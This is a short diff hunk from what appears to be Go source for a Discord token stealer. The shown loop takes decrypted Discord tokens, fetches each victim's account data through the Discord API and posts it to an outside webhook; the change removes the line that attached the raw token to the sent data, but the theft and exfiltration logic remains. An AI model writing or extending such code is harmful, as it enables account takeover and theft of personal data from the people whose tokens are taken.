@@ -184,7 +184,6 @@ func main() {
 	for _, token := range decryptedTokens {
 		account, err := getAccountData(token) // Use the Discord API to get user data about the account
 			if err != nil {log.Fatal(err)}
-		account.Token = token // Add the token value to the data from the user API
 		webhookErr := sendAccountDataToWebhook(account, webhookUrl)	// Have to use new error value
 			if webhookErr != nil {log.Fatal(webhookErr)}			// here - kinda dumb but whatever
 	}
